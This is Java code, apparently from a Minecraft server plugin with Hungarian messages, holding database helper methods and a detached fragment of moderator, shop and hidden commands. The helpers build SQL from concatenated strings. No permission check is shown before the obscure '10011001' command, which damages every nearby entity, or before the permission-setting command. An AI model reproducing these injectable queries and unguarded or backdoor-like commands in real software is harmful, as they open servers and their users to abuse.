	protected static Integer databaseGetInteger(String what, String from, String when, Integer out) {
		try {
			ResultSet rs = database.query("SELECT " + what + " FROM " + from + " WHERE "+when);
            while (rs.next())
            	return rs.getInt(what);
        } catch (Exception e) {
            logger.info("databaseGetInteger -> Exception: " + e.getMessage());
        }

		return out;
	}
	protected static Double databaseGetDouble(String what, String from, String when, Double out) {
		try {
			ResultSet rs = database.query("SELECT " + what + " FROM " + from + " WHERE "+when);
            while (rs.next())
            	return rs.getDouble(what);
        } catch (Exception e) {
            logger.info("databaseGetInteger -> Exception: " + e.getMessage());
        }

		return out;
	}
	protected static Float databaseGetFloat(String what, String from, String when, Float out) {
		try {
			ResultSet rs = database.query("SELECT " + what + " FROM " + from + " WHERE "+when);
            while (rs.next())
            	return rs.getFloat(what);
        } catch (Exception e) {
            logger.info("databaseGetInteger -> Exception: " + e.getMessage());
        }

		return out;
	}
	protected static String databaseGetString(String what, String from, String when, String out) {
		try {
			ResultSet rs = database.query("SELECT " + what + " FROM " + from + " WHERE "+when);
            while (rs.next())
            	return rs.getString(what);
        } catch (Exception e) {
            logger.info("databaseGetString -> Exception: " + e.getMessage());
        }

		return out;
	}
	protected static Boolean databaseGetBoolean(String what, String from, String when, Boolean out) {
		try {
			ResultSet rs = database.query("SELECT " + what + " FROM " + from + " WHERE "+when);
            while (rs.next())
            	if(rs.getInt(what) == 1)
            		return true;
            	else
            		return false;
        } catch (Exception e) {
            logger.info("databaseGetBoolean -> Exception: " + e.getMessage());
        }

		return out;
	}
	protected static Boolean databaseIsIn(String what, String from, String when) {
		String query = databaseGetString(what, from, when, "101010");
		if(query == null || query == "" || query == "101010")
			return false;
		return true;
	}
	protected static void databaseInsert(String sql) {
		try {
			database.query(sql);
        } catch (Exception e) {
            logger.info("databaseInsert -> Exception: " + e.getMessage());
        }
	}
	protected static void databaseUpdate(String sql) {
		try {
			database.query(sql);
        } catch (Exception e) {
            logger.info("databaseUpdate -> Exception: " + e.getMessage());
        }
	}
	protected static void databaseDelete(String sql) {
		try {
			database.query(sql);
        } catch (Exception e) {
            logger.info("databaseDelete -> Exception: " + e.getMessage());
        }
	}
	
	
	
	
	if(command.equalsIgnoreCase("10011001")) {
		    List<Entity> nearby =  player.getNearbyEntities(64, 64, 64);
		    for (Entity tmp: nearby)
		       if (tmp instanceof Damageable)
		          ((Damageable) tmp).damage(100);
		}
		
		if(command.equalsIgnoreCase("man"))
		{
			if(args.length == 0) {
				player.sendMessage(BLUE + "--- { MAN(UAL MOD) Parancsok } ---");
				player.sendMessage(WHITE + "/man jog <név> <jog>" + AQUA + " " + "Játékos jogkörének beállítása");
				player.sendMessage(WHITE + "/man nemit <név> [percek]" + AQUA + " " + "A játékos lenémítása / feloldása");
				player.sendMessage(WHITE + "/" + AQUA + " " + "");
				player.sendMessage(WHITE + "/" + AQUA + " " + "");
				player.sendMessage(WHITE + "/" + AQUA + " " + "");
				player.sendMessage(WHITE + "/" + AQUA + " " + "");
				player.sendMessage(WHITE + "/man borton <név> [percek]" + AQUA + " " + "Játékos börtönbe zárása / kiengedése onnan");
			}
			else
				switch(args[0]) {
					case "borton":
						if(args.length == 2)
							if(getPlayerStatBool("inJail", args[1])) {
								setPlayerStat("inJail", args[1], "0");
								
								if(server.getPlayer(args[1]) != null) {
									server.broadcastMessage(GREEN + name + " kiengedte a börtönböl " + args[1] + " játékost.");
									teleportToLocationPoint(server.getPlayer(args[1]), "players_points", args[1], "back", false, GREEN+">> Visszakerültél arra a pontra, ahonnan elhurcoltak a celládba.", RED+"Valami probléma merült fel... kérlek szólj egy adminnak!");
								}
							}
							else {
								setPlayerStat("inJail", args[1], "1");

								if(server.getPlayer(args[1]) != null) {
									server.broadcastMessage(RED + name + " börtönbe zárta " + args[1] + " játékost.");
									teleportToLocationPoint(server.getPlayer(args[1]), "players_points", "SYSTEM", "jail", true, (RED + ">> " + name + " börtönbe zárt téged."), (RED + "Hiba történt, nem kerülsz a börtönbe."));
								}	
							}
						else
							player.sendMessage(RED + ">> Így használd: /man borton <név>");
					break;
					case "nemit":
						if(args.length == 2)
							if(getPlayerStatBool("inSoap", args[1])) {
								setPlayerStat("inSoap", args[1], "0");
								player.sendMessage(RED + "Visszavontad játékosnak a némítását: "+args[1]);
								
								if(server.getPlayer(args[1]) != null)
									server.getPlayer(args[1]).sendMessage(RED + ">> " + name + " visszavonta a némításod.");
							}
							else {
								setPlayerStat("inSoap", args[1], "1");
								player.sendMessage(RED + "Lenémítottad ezt a játékost: "+args[1]);
								
								if(server.getPlayer(args[1]) != null)
									server.getPlayer(args[1]).sendMessage(RED + ">> " + name + " lenémított téged.");
							}
						else
							player.sendMessage(RED + ">> Így használd: /man nemit <név>");
					break;
					case "jog":
						if(args.length != 3)
							player.sendMessage(RED + ">> Így használd: /man jog <név> <jog>");
						else {
							Integer permToSet = 0;
							if(args[2].equals("latogato"))
								permToSet = 0;
							else if(args[2].equals("buntetett"))
								permToSet = 1;
							else if(args[2].equals("tag"))
								permToSet = 2;
							else if(args[2].equals("vip"))
								permToSet = 3;
							else if(args[2].equals("tamogato"))
								permToSet = 3;
							else if(args[2].equals("mod"))
								permToSet = 4;
							else if(args[2].equals("moderator"))
								permToSet = 4;
							else if(args[2].equals("admin"))
								permToSet = 5;
							else if(args[2].equals("tulaj"))
								permToSet = 6;
							else if(args[2].equals("tulajdonos"))
								permToSet = 6;
							else
								permToSet = -1;
							
							if(permToSet.equals(-1))
								player.sendMessage(RED + "Ilyen jogkört nem ismerek: "+args[2]);
							else {
								setPlayerStat("perm", args[1], permToSet.toString());
								player.sendMessage(YELLOW + "Beállítottad "+args[1]+" jogkörét erre: "+args[2]+".");
							}
						}
					break;
					default:
						player.sendMessage(RED + ">> A MAN parancshoz nem találtam ilyen paramétert: "+args[0]+".");
					break;
				}
		}
		
		if(command.equalsIgnoreCase("vesz")) { /** TODO **/
			
			if(args.length == 1) {

				/**/ // Not product related
				switch(args[0]) {
					case "haza":
						if(getPlayerStatInt("points", name) >= 5) {
							player.sendMessage(GREEN + "Megvásároltad ezt: otthonpont beállítása.");
							saveLocationPoint("players_points", name, "home", player.getLocation());
							setPlayerStat("points", name, getPlayerStatInt("points", name) - 5);
						}
						else
							player.sendMessage(RED + ">> Nincs elég pontod ezen termék megvásárlásához.");
					break;
				}
				

			}
			
		}
